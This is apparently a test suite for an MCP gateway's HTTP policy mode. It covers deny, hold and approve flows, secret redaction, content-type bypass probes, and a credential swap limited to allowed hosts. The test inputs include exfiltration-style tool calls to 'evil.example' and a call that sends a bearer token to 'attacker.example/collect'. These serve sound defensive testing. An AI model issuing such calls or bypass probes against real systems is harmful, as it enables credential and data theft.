/**
 * `http --policy`: gateway mode over the streamable-HTTP transport.
 *
 * Same claims as the stdio gateway's suite, asserted the same way round:
 * what the TARGET received (its own body journal, never the recorder's
 * evidence), what the CLIENT received (bytes), and what the chain holds.
 * Every deny test has an allow arm beside it, so a deny that never happened
 * cannot pass for the wrong reason.
 */

import { createServer, request as httpRequest } from 'node:http';
import type { IncomingMessage, Server } from 'node:http';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { gzipSync } from 'node:zlib';
import type { AddressInfo } from 'node:net';
import { afterEach, describe, expect, it } from 'vitest';

import { Recorder } from '../src/capture/recorder.js';
import { sha256Ref } from '../src/chain/hash.js';
import { Signer } from '../src/chain/keys.js';
import { HoldStore } from '../src/gateway/holds.js';
import type { GatewayOptions } from '../src/gateway/options.js';
import { credentialSwapFromPolicy } from '../src/broker/wire.js';
import { formatPolicyErrors, validatePolicyObject } from '../src/policy/validate.js';
import type { LoadedPolicy } from '../src/policy/load.js';
import { runHttpProxy } from '../src/proxy/http.js';
import { SseEventSplitter, rewriteSseEvent } from '../src/proxy/http-gateway.js';
import { Redactor, forgetBrokeredSecrets } from '../src/redact/redactor.js';
import { openStore } from '../src/store/index.js';
import type { AnyEvent, NotificationEvent, PolicyDecisionEvent, ToolCallEvent } from '../src/schema/events.js';

/* ------------------------------- helpers -------------------------------- */

const cleanups: Array<() => void | Promise<void>> = [];
afterEach(async () => {
  while (cleanups.length > 0) {
    const fn = cleanups.pop()!;
    try {
      await fn();
    } catch {
      /* best-effort teardown */
    }
  }
  forgetBrokeredSecrets();
});

function tmpDataDir(): string {
  const dir = mkdtempSync(join(tmpdir(), 'mcp-rec-http-gw-'));
  cleanups.push(() => rmSync(dir, { recursive: true, force: true }));
  return dir;
}

function readBody(req: IncomingMessage): Promise<string> {
  return new Promise((resolve, reject) => {
    const chunks: Buffer[] = [];
    req.on('data', (c: Buffer) => chunks.push(c));
    req.on('end', () => resolve(Buffer.concat(chunks).toString('utf8')));
    req.on('error', reject);
  });
}

function listen(server: Server): Promise<string> {
  return new Promise((resolve) => {
    server.listen(0, '127.0.0.1', () => {
      const { port } = server.address() as AddressInfo;
      resolve(`http://127.0.0.1:${port}`);
    });
  });
}

const SECRET = 'sk-live-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123';
const REAL_TOKEN = 'ghs_RealCanaryTokenNeverStored0123456789';
const SYNTHETIC = 'cresec_synth_v1_' + Buffer.alloc(32, 0x5a).toString('base64url');

interface Journal {
  bodies: string[];
  headers: Array<Record<string, string | string[] | undefined>>;
}

/**
 * A JSON target with a body journal. `echo` answers with the arguments;
 * `leak` puts a secret in the result next to a big integer; `post_message`
 * answers with a fixed text and never echoes its Authorization header.
 */
async function startJsonTarget(opts: { gzip?: boolean } = {}): Promise<{ url: string; journal: Journal }> {
  const journal: Journal = { bodies: [], headers: [] };
  const server = createServer(async (req, res) => {
    const body = await readBody(req);
    journal.bodies.push(body);
    journal.headers.push(req.headers);
    const msg = JSON.parse(body) as { id?: number; method?: string; params?: { name?: string; arguments?: Record<string, unknown> } };
    if (msg.id === undefined) {
      res.writeHead(202);
      res.end();
      return;
    }
    let out: string;
    if (msg.method === 'initialize') {
      out = JSON.stringify({ jsonrpc: '2.0', id: msg.id, result: { protocolVersion: '2025-03-26', serverInfo: { name: 'http-target', version: '1' }, capabilities: {} } });
    } else if (msg.method === 'tools/call' && msg.params?.name === 'leak') {
      // Hand-written so the splice has something to preserve: a big integer
      // and a float with a trailing zero.
      out = `{"jsonrpc":"2.0", "id":${String(msg.id)}, "result":{"content":[{"type":"text","text":"token=${SECRET}"}],"big":98765432109876543210,"float":2.0}  }`;
    } else if (msg.method === 'tools/call') {
      out = JSON.stringify({ jsonrpc: '2.0', id: msg.id, result: { content: [{ type: 'text', text: JSON.stringify(msg.params?.arguments ?? {}) }] } });
    } else {
      out = JSON.stringify({ jsonrpc: '2.0', id: msg.id, result: { ok: true } });
    }
    if (opts.gzip === true) {
      const z = gzipSync(Buffer.from(out, 'utf8'));
      res.writeHead(200, { 'content-type': 'application/json', 'content-encoding': 'gzip', 'content-length': z.length });
      res.end(z);
      return;
    }
    res.writeHead(200, { 'content-type': 'application/json', 'content-length': Buffer.byteLength(out) });
    res.end(out);
  });
  const url = (await listen(server)) + '/mcp';
  cleanups.push(() => new Promise<void>((r) => server.close(() => r())));
  return { url, journal };
}

/** An SSE target: a notification frame, then the tools/call result frame carrying a secret. */
async function startSseTarget(): Promise<{ url: string; journal: Journal }> {
  const journal: Journal = { bodies: [], headers: [] };
  const server = createServer(async (req, res) => {
    const body = await readBody(req);
    journal.bodies.push(body);
    journal.headers.push(req.headers);
    const msg = JSON.parse(body) as { id: number; method: string };
    res.writeHead(200, { 'content-type': 'text/event-stream', 'cache-control': 'no-cache' });
    const note = JSON.stringify({ jsonrpc: '2.0', method: 'notifications/message', params: { level: 'info', data: 'working on it' } });
    res.write(`event: message\r\nid: 7\r\ndata: ${note}\r\n\r\n`);
    setTimeout(() => {
      const reply = msg.method === 'tools/call'
        ? `{"jsonrpc":"2.0","id":${String(msg.id)},"result":{"content":[{"type":"text","text":"key=${SECRET}"}],"big":12345678901234567890}}`
        : JSON.stringify({ jsonrpc: '2.0', id: msg.id, result: { protocolVersion: '2025-03-26', serverInfo: { name: 'sse-target' }, capabilities: {} } });
      res.write(`data: ${reply}\n\n`);
      res.end();
    }, 30);
  });
  const url = (await listen(server)) + '/mcp';
  cleanups.push(() => new Promise<void>((r) => server.close(() => r())));
  return { url, journal };
}

function loadedPolicy(doc: Record<string, unknown>): LoadedPolicy {
  const r = validatePolicyObject(doc);
  if (!r.ok) throw new Error(formatPolicyErrors(r.errors));
  const out: LoadedPolicy = { policy: r.policy, hash: sha256Ref(JSON.stringify(doc)), source: 'json', path: '/policy.json' };
  if (r.policy.name !== undefined) out.name = r.policy.name;
  return out;
}

const POLICY = {
  version: 1,
  name: 'http-gw-test',
  mcp: {
    default: 'allow',
    rules: [
      { id: 'no-exfil', match: { tool: 'http_post' }, action: deny_(), reason: 'no outbound HTTP' },
      { id: 'careful', match: { tool: 'delete_*' }, action: 'hold' },
    ],
    hold: { timeout_ms: 5000, on_timeout: 'deny' },
    boundary: { secrets: 'redact', injection: 'flag' },
  },
};
function deny_(): 'deny' {
  return 'deny';
}

async function startGateway(
  targetUrl: string,
  dataDir: string,
  over: { policy?: Record<string, unknown>; env?: NodeJS.ProcessEnv; pollMs?: number } = {},
) {
  const store = openStore({ dataDir });
  const signer = await Signer.load(dataDir);
  const recorder = new Recorder({ store, signer });
  const policy = loadedPolicy(over.policy ?? POLICY);
  const gateway: GatewayOptions = { policy, holdStore: new HoldStore(dataDir), pollMs: over.pollMs ?? 20 };
  const wiring = credentialSwapFromPolicy({ policy: policy.policy, env: over.env ?? {}, warn: () => {} });
  if (wiring !== undefined) gateway.credentials = wiring.swap;
  const proxy = await runHttpProxy({ targetUrl, recorder, redactor: new Redactor(), proxyVersion: '0.0.0-test', gateway });
  cleanups.push(() => proxy.close());
  return { proxy, holdStore: gateway.holdStore };
}

function loadEvents(dataDir: string): AnyEvent[] {
  const store = openStore({ dataDir });
  try {
    return [...store.iterate()].map((r) => r.event);
  } finally {
    store.close();
  }
}

const post = (url: string, body: string | unknown, headers: Record<string, string> = {}): Promise<Response> =>
  fetch(url, {
    method: 'POST',
    headers: { 'content-type': 'application/json', accept: 'application/json, text/event-stream', ...headers },
    body: typeof body === 'string' ? body : JSON.stringify(body),
  });

const call = (id: number, name: string, args: Record<string, unknown>) => ({ jsonrpc: '2.0', id, method: 'tools/call', params: { name, arguments: args } });

/* --------------------------------- tests -------------------------------- */

describe('http --policy: allow, deny, hold', () => {
  it('a denied tools/call never reaches the target; the client gets an isError result; the chain holds policy_decision (with decision_id) + the synthetic tool_call', async () => {
    const dataDir = tmpDataDir();
    const { url, journal } = await startJsonTarget();
    const { proxy } = await startGateway(url, dataDir);

    const denied = await post(proxy.url, call(2, 'http_post', { url: 'https://evil.example', body: 'denied-probe' }));
    expect(denied.status).toBe(200);
    const res = (await denied.json()) as { id: number; result: { isError: boolean; content: Array<{ text: string }> } };
    expect(res.id).toBe(2);
    expect(res.result.isError).toBe(true);
    expect(res.result.content[0]!.text).toContain('denied by policy rule "no-exfil": no outbound HTTP');

    // The control arm: an allowed call DOES reach the target, byte for byte.
    const rawAllowed = '{"jsonrpc":"2.0", "id":3, "method":"tools/call", "params":{"name":"echo","arguments":{"big":12345678901234567890,"float":1.0,"note":"allowed"}}}';
    const allowed = await post(proxy.url, rawAllowed);
    expect(allowed.status).toBe(200);
    expect(((await allowed.json()) as { result: { content: Array<{ text: string }> } }).result.content[0]!.text).toContain('allowed');
    await proxy.close();

    // NEGATIVE CONTROL: the target's journal is the witness, not the recorder.
    expect(journal.bodies).toEqual([rawAllowed]);
    expect(journal.bodies.join('\n')).not.toContain('denied-probe');
    // And the upstream was told not to compress.
    expect(journal.headers[0]!['accept-encoding']).toBe('identity');

    const events = loadEvents(dataDir);
    const decisions = events.filter((e): e is PolicyDecisionEvent => e.kind === 'policy_decision');
    expect(decisions).toHaveLength(1);
    expect(decisions[0]).toMatchObject({ decision: 'deny', tool: 'http_post', request_id: 2, rule_id: 'no-exfil' });
    expect(decisions[0]!.decision_id).toMatch(/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/);
    expect(decisions[0]!.attributes['cresec.policy.decision_id']).toBe(decisions[0]!.decision_id);
    const calls = events.filter((e): e is ToolCallEvent => e.kind === 'tool_call');
    expect(calls.map((c) => [c.tool, c.gateway?.decision, c.is_error])).toEqual([
      ['http_post', 'deny', true],
      ['echo', 'allow', false],
    ]);
    // The synthetic tool_call joins the decision on the same id.
    expect(calls[0]!.attributes['cresec.policy.decision_id']).toBe(decisions[0]!.decision_id);
    expect(calls[1]!.gateway?.boundary).toMatchObject({ scanned: true, action: 'none' });
    expect((events[0] as { policy?: { hash: string; name?: string } }).policy).toEqual({ hash: sha256Ref(JSON.stringify(POLICY)), name: 'http-gw-test' });
  });

  it('a held tools/call is parked until `approve`, then forwarded; a denied hold is refused', async () => {
    const dataDir = tmpDataDir();
    const { url, journal } = await startJsonTarget();
    const { proxy, holdStore } = await startGateway(url, dataDir);

    const pending = post(proxy.url, call(4, 'delete_file', { path: '/tmp/x' }));
    // The hold file appears; nothing has been forwarded yet.
    let holds = holdStore.list();
    for (let i = 0; i < 100 && holds.length === 0; i++) {
      await new Promise((r) => setTimeout(r, 20));
      holds = holdStore.list();
    }
    expect(holds).toHaveLength(1);
    expect(holds[0]!.tool).toBe('delete_file');
    expect(journal.bodies).toEqual([]);

    holdStore.decide(holds[0]!.approval_id, 'approved', 'tester');
    const approved = (await (await pending).json()) as { result: { content: Array<{ text: string }> } };
    expect(approved.result.content[0]!.text).toContain('/tmp/x');
    expect(journal.bodies).toHaveLength(1);

    // The other outcome.
    const pending2 = post(proxy.url, call(5, 'delete_file', { path: '/tmp/y' }));
    holds = holdStore.list().filter((h) => h.status === 'pending');
    for (let i = 0; i < 100 && holds.length === 0; i++) {
      await new Promise((r) => setTimeout(r, 20));
      holds = holdStore.list().filter((h) => h.status === 'pending');
    }
    holdStore.decide(holds[0]!.approval_id, 'denied', 'tester');
    const refused = (await (await pending2).json()) as { result: { isError: boolean; content: Array<{ text: string }> } };
    expect(refused.result.isError).toBe(true);
    expect(refused.result.content[0]!.text).toContain('hold');
    await proxy.close();
    expect(journal.bodies).toHaveLength(1); // the denied one never crossed

    const events = loadEvents(dataDir);
    const decisions = events.filter((e): e is PolicyDecisionEvent => e.kind === 'policy_decision');
    expect(decisions.map((d) => [d.decision, d.outcome, d.approver])).toEqual([
      ['hold', 'approved', 'tester'],
      ['hold', 'denied', 'tester'],
    ]);
    const calls = events.filter((e): e is ToolCallEvent => e.kind === 'tool_call');
    expect(calls[0]!.gateway).toMatchObject({ decision: 'hold', outcome: 'approved', approval_id: decisions[0]!.approval_id });
    // A denied hold is recorded as the hold it was, with its outcome — the
    // same shape the stdio gateway writes.
    expect(calls[1]!.gateway).toMatchObject({ decision: 'hold', outcome: 'denied' });
  });

  it('a body the gateway cannot evaluate is refused, never forwarded: not JSON (400), a batch with a denied element (answered locally)', async () => {
    const dataDir = tmpDataDir();
    const { url, journal } = await startJsonTarget();
    const { proxy } = await startGateway(url, dataDir);

    const notJson = await post(proxy.url, '{"jsonrpc":"2.0", "id": 9, "method": tools/call');
    expect(notJson.status).toBe(400);
    expect(((await notJson.json()) as { error: { code: number } }).error.code).toBe(-32600);

    const batch = await post(proxy.url, [call(10, 'echo', { a: 1 }), call(11, 'http_post', { url: 'x' }), { jsonrpc: '2.0', id: 12, method: 'tools/list' }]);
    expect(batch.status).toBe(200);
    const answers = (await batch.json()) as Array<{ id: number; result?: { isError?: boolean }; error?: { code: number } }>;
    expect(answers.map((a) => a.id)).toEqual([10, 11, 12]);
    expect(answers[0]!.result?.isError).toBe(true); // batched with a refused call
    expect(answers[1]!.result?.isError).toBe(true); // the deny itself
    expect(answers[2]!.error?.code).toBe(-32600);
    await proxy.close();
    expect(journal.bodies).toEqual([]);

    const decisions = loadEvents(dataDir).filter((e): e is PolicyDecisionEvent => e.kind === 'policy_decision');
    expect(decisions.map((d) => [d.request_id, d.rule_id])).toEqual([
      [10, undefined],
      [11, 'no-exfil'],
    ]);
  });

  it('a tools/call is gated whatever the content-type says: text/plain, and no content-type at all, never reach the target', async () => {
    const dataDir = tmpDataDir();
    const { url, journal } = await startJsonTarget();
    const { proxy } = await startGateway(url, dataDir);
    const denied = JSON.stringify(call(21, 'http_post', { url: 'https://evil.example', body: 'BYPASS-TEXT-PLAIN' }));

    // text/plain: fetch honours the header it is given.
    const asText = await post(proxy.url, denied, { 'content-type': 'text/plain' });
    expect(asText.status).toBe(200);
    const textRes = (await asText.json()) as { id: number; result: { isError: boolean; content: Array<{ text: string }> } };
    expect(textRes.id).toBe(21);
    expect(textRes.result.isError).toBe(true);
    expect(textRes.result.content[0]!.text).toContain('denied by policy rule "no-exfil"');

    // No content-type at all: node:http, because fetch adds one to a string body.
    const bareBody = denied.replace('BYPASS-TEXT-PLAIN', 'BYPASS-NO-CT');
    const bare = await new Promise<{ status: number; body: string }>((resolve, reject) => {
      const u = new URL(proxy.url);
      const r = httpRequest({ host: u.hostname, port: u.port, method: 'POST', path: '/', headers: { 'content-length': Buffer.byteLength(bareBody) } }, (res) => {
        const chunks: Buffer[] = [];
        res.on('data', (c: Buffer) => chunks.push(c));
        res.on('end', () => resolve({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString('utf8') }));
      });
      r.on('error', reject);
      r.end(bareBody);
    });
    expect(bare.status).toBe(200);
    expect((JSON.parse(bare.body) as { result: { isError: boolean } }).result.isError).toBe(true);

    // A body that is not JSON, under a content-type that does not claim to be, is refused too — not forwarded.
    const form = await post(proxy.url, 'name=http_post&url=https%3A%2F%2Fevil.example', { 'content-type': 'application/x-www-form-urlencoded' });
    expect(form.status).toBe(400);

    // The control arm: the same call as application/json is the same deny; an allowed call still crosses.
    const allowed = await post(proxy.url, call(22, 'echo', { note: 'still-allowed' }));
    expect(((await allowed.json()) as { result: { content: Array<{ text: string }> } }).result.content[0]!.text).toContain('still-allowed');
    await proxy.close();

    // NEGATIVE CONTROL: with the gate keyed on the content-type header, the
    // first two bodies land in this journal (the probe that found it did).
    expect(journal.bodies).toHaveLength(1);
    expect(journal.bodies[0]).toContain('still-allowed');
    expect(journal.bodies.join('\n')).not.toContain('BYPASS');
    const decisions = loadEvents(dataDir).filter((e): e is PolicyDecisionEvent => e.kind === 'policy_decision');
    expect(decisions.map((d) => [d.request_id, d.rule_id])).toEqual([
      [21, 'no-exfil'],
      [21, 'no-exfil'],
    ]);
  });

  it('a tools/call notification the policy refuses gets 202 and a notification event with gateway.decision; an unusable id gets -32600', async () => {
    const dataDir = tmpDataDir();
    const { url, journal } = await startJsonTarget();
    const { proxy } = await startGateway(url, dataDir);

    const refusedNote = await post(proxy.url, { jsonrpc: '2.0', method: 'tools/call', params: { name: 'http_post', arguments: {} } });
    expect(refusedNote.status).toBe(202);
    const forwardedNote = await post(proxy.url, { jsonrpc: '2.0', method: 'tools/call', params: { name: 'echo', arguments: {} } });
    expect(forwardedNote.status).toBe(202);
    const nullId = await post(proxy.url, { jsonrpc: '2.0', id: null, method: 'tools/call', params: { name: 'echo', arguments: {} } });
    expect(nullId.status).toBe(400);
    await proxy.close();
    expect(journal.bodies).toHaveLength(1);
    expect(journal.bodies[0]).toContain('"echo"');

    const notes = loadEvents(dataDir).filter((e): e is NotificationEvent => e.kind === 'notification' && e.method === 'tools/call');
    expect(notes.map((n) => n.gateway)).toEqual([
      { decision: 'deny', rule_id: 'no-exfil' },
      undefined,
      { decision: 'deny', refusal: 'invalid_request_id' },
    ]);
  });
});

describe('http --policy: the boundary filter on the way back', () => {
  it('JSON: the secret is rewritten to its ref and every other byte of the body crosses as the target wrote it', async () => {
    const dataDir = tmpDataDir();
    const { url } = await startJsonTarget();
    const { proxy } = await startGateway(url, dataDir);

    const res = await post(proxy.url, call(6, 'leak', {}));
    const text = await res.text();
    expect(res.headers.get('content-length')).toBe(String(Buffer.byteLength(text)));
    expect(text).not.toContain(SECRET);
    expect(text).toMatch(/\[redacted:sha256:[0-9a-f]{16}\]/);
    // The splice invariant: the big integer keeps every digit, the float its `.0`, the whitespace stays.
    expect(text).toContain('"big":98765432109876543210,"float":2.0}  }');
    expect(text).toContain('{"jsonrpc":"2.0", "id":6, "result":');
    await proxy.close();

    const calls = loadEvents(dataDir).filter((e): e is ToolCallEvent => e.kind === 'tool_call');
    expect(calls[0]!.gateway?.boundary).toMatchObject({ scanned: true, action: 'redact', secrets_found: 1 });
    expect(calls[0]!.gateway?.boundary?.secret_refs).toContain(sha256Ref(SECRET));
    expect(calls[0]!.gateway?.boundary?.delivered_result_hash).toMatch(/^sha256:/);
    // NEGATIVE CONTROL: the recorded result is the RAW server result (hashed).
    expect(calls[0]!.result_hash).not.toBe(calls[0]!.gateway?.boundary?.delivered_result_hash);
    expect(JSON.stringify(calls[0])).not.toContain(SECRET);
  });

  it('SSE: only the event carrying the tools/call result is rewritten; the notification frame before it crosses verbatim (CRLF included)', async () => {
    const dataDir = tmpDataDir();
    const { url } = await startSseTarget();
    const { proxy } = await startGateway(url, dataDir);

    const res = await post(proxy.url, call(7, 'leak', {}));
    expect(res.headers.get('content-type')).toContain('text/event-stream');
    const text = await res.text();
    expect(text.startsWith('event: message\r\nid: 7\r\ndata: {"jsonrpc":"2.0","method":"notifications/message"')).toBe(true);
    expect(text).not.toContain(SECRET);
    expect(text).toContain('[redacted:sha256:');
    expect(text).toContain('"big":12345678901234567890}');
    await proxy.close();

    const events = loadEvents(dataDir);
    const calls = events.filter((e): e is ToolCallEvent => e.kind === 'tool_call');
    expect(calls).toHaveLength(1);
    expect(calls[0]!.gateway?.boundary).toMatchObject({ action: 'redact', secrets_found: 1 });
    expect(events.some((e) => e.kind === 'notification' && e.method === 'notifications/message')).toBe(true);
  });

  it('a compressed upstream response is refused (502): the filter cannot read it, so the client must not either', async () => {
    const dataDir = tmpDataDir();
    const { url } = await startJsonTarget({ gzip: true });
    const { proxy } = await startGateway(url, dataDir);
    const res = await post(proxy.url, call(8, 'leak', {}));
    expect(res.status).toBe(502);
    const text = await res.text();
    expect(text).not.toContain(SECRET);
    expect(text).toContain('compressed');
    await proxy.close();
  });
});

describe('http --policy: the credential swap over HTTP', () => {
  const policy = {
    version: 1,
    name: 'http-gw-swap',
    mcp: { default: 'allow', boundary: { secrets: 'redact', injection: 'flag' } },
    credentials: [
      {
        id: 'post-token',
        provider: 'example',
        source: { type: 'env', var: 'E2E_REAL_TOKEN' },
        use: [{ id: 'post', tool: 'post_message', arg: 'headers.Authorization', host: { from_arg: 'url', allow: ['api.example.test'] } }],
      },
    ],
  };

  it('the target receives the real token at the declared site; the client, the chain and an undeclared host never do', async () => {
    const dataDir = tmpDataDir();
    const { url, journal } = await startJsonTarget();
    // The env source reads the process environment (as the CLI's does).
    process.env.E2E_REAL_TOKEN = REAL_TOKEN;
    cleanups.push(() => {
      delete process.env.E2E_REAL_TOKEN;
    });
    const { proxy } = await startGateway(url, dataDir, { policy, env: { MCP_RECORDER_SYNTHETIC_POST_TOKEN: SYNTHETIC, E2E_REAL_TOKEN: REAL_TOKEN } });

    const ok = await post(proxy.url, call(1, 'post_message', { url: 'https://api.example.test/v1/messages', headers: { Authorization: `Bearer ${SYNTHETIC}` }, body: 'hi' }));
    const okText = await ok.text();
    expect(okText).not.toContain(REAL_TOKEN);
    expect(journal.bodies).toHaveLength(1);
    expect(journal.bodies[0]).toContain(`Bearer ${REAL_TOKEN}`);
    expect(journal.bodies[0]).not.toContain(SYNTHETIC);

    // The echo target reflects the token; the client sees the synthetic (reverse scrub).
    expect(okText).toContain(SYNTHETIC);

    const bad = await post(proxy.url, call(2, 'post_message', { url: 'https://attacker.example/collect', headers: { Authorization: `Bearer ${SYNTHETIC}` } }));
    const badRes = (await bad.json()) as { result: { isError: boolean; content: Array<{ text: string }> } };
    expect(badRes.result.isError).toBe(true);
    expect(badRes.result.content[0]!.text).toContain('host_not_allowed');
    await proxy.close();
    expect(journal.bodies).toHaveLength(1);

    const raw = JSON.stringify(loadEvents(dataDir));
    expect(raw).not.toContain(REAL_TOKEN);
    expect(raw).not.toContain(sha256Ref(REAL_TOKEN));
    expect(raw).toContain('"cresec.credential.id":"post-token"');
    expect(raw).toContain('"cresec.broker.decision_id"');
  });
});

describe('SseEventSplitter / rewriteSseEvent', () => {
  it('splits on blank lines across chunk boundaries, joins multi-line data, keeps raw bytes, and flushes the tail', () => {
    const s = new SseEventSplitter();
    const a = s.push(Buffer.from('event: x\ndata: {"a":\ndata: 1}\n\ndata: second'));
    expect(a).toHaveLength(1);
    expect((a[0] as { data?: string }).data).toBe('{"a":\n1}');
    expect((a[0] as { raw: Buffer }).raw.toString()).toBe('event: x\ndata: {"a":\ndata: 1}\n\n');
    const b = s.push(Buffer.from('-half\r\n\r\n: comment\n\n'));
    expect(b.map((e) => (e as { data?: string }).data)).toEqual(['second-half', undefined]);
    expect(s.end()).toBeUndefined();
    s.push(Buffer.from('data: tail'));
    expect(s.end()?.data).toBe('tail');
  });

  it('an event past the cap is handed back oversized and parsing resumes at the next boundary', () => {
    const s = new SseEventSplitter(16);
    const out = s.push(Buffer.from('data: ' + 'x'.repeat(40)));
    expect(out).toEqual([{ raw: expect.any(Buffer), oversized: true }]);
    const more = s.push(Buffer.from('yyy\n\ndata: ok\n\n'));
    expect(more.map((e) => ('oversized' in e ? 'over' : (e as { data?: string }).data))).toEqual(['over', 'ok']);
  });

  it('rewriteSseEvent keeps every non-data line and emits one data line in the first data line\'s place', () => {
    const raw = Buffer.from('event: message\r\nid: 3\r\ndata: {"a":\r\ndata: 1}\r\n\r\n');
    expect(rewriteSseEvent(raw, '{"a":2}').toString()).toBe('event: message\r\nid: 3\r\ndata: {"a":2}\r\n\r\n');
    expect(rewriteSseEvent(Buffer.from('data: x\n\n'), 'y').toString()).toBe('data: y\n\n');
  });
});
